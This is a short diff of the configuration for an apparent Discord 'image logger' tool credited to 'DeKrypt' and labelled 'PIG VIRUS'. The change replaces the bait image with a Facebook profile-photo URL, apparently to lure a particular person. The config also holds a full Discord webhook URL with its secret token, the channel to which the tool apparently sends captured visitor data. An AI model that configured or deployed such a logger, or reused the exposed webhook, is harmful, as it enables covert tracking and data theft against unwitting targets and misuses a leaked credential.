@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1359382890751725588/c-jxRmgOQPZN4_QvA8J5jhDnubu80Gixs6eDEuDA18X2638IpxRgWb-pS6vX9vlE_iMB",
-    "image": "https://i.imgur.com/AdUp7AC.jpeg",
+    "image": "https://scontent.fhan3-2.fna.fbcdn.net/v/t39.30808-1/506490192_634777092950245_3747398490066748014_n.jpg?stp=dst-jpg_s100x100_tt6&_nc_cat=107&ccb=1-7&_nc_sid=e99d92&_nc_ohc=tk_Er6vxrT4Q7kNvwFrtOMy&_nc_oc=AdkSHVd-Gu62QWxXNDYXVCQNR7V5BIi1nIg3wPeyWBQhc55bszZZauvXOZyOUA14aCu7w1xnA8XZthPhsDely1On&_nc_zt=24&_nc_ht=scontent.fhan3-2.fna&_nc_gid=ylIxKnzAF9uz8dNDrJ6Tsg&oh=00_AfO4q7VwIL4arOSyqPWMeCAtNmtS1IvY6bUwk8bW_JHW2g&oe=6866AEED",
     "imageArgument": True,
     "username": "PIG VIRUS",
     "color": 0x00FFFF,
